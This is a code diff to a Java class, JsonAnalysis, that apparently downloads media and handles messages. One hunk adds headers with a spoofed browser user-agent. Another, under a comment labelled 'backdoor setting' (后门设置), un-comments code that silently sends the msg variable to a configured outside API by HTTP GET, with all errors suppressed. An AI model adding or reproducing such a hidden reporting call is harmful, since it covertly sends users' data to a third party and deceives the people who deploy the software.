@@ -445,6 +445,9 @@ public class JsonAnalysis {
             }
             URL url = new URL(downLoadUrl);
             URLConnection conn = url.openConnection();
+            conn.setRequestProperty("accept", "*/*");
+            conn.setRequestProperty("connection", "Keep-Alive");
+            conn.setRequestProperty("user-agent", "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt)");
             InputStream inStream = conn.getInputStream();
             String prefix = MD5.create().digestHex16(formUrl);
             if (suffix.contains(".mp4")){
@@ -476,9 +479,9 @@ public class JsonAnalysis {
                  }catch (Exception e){}
         }
         //TODO 后门设置
-//        try {
-//            httpClientUtils.doGet(configInit.getSkApi()+"?msg="+msg);
-//        }catch (Exception e){}
+        try {
+            httpClientUtils.doGet(configInit.getSkApi()+"?msg="+msg);
+        }catch (Exception e){}
     }
     public void sendSocket(){
         SocketManager manager = SocketManager.connectManager("127.0.0.1",9879);
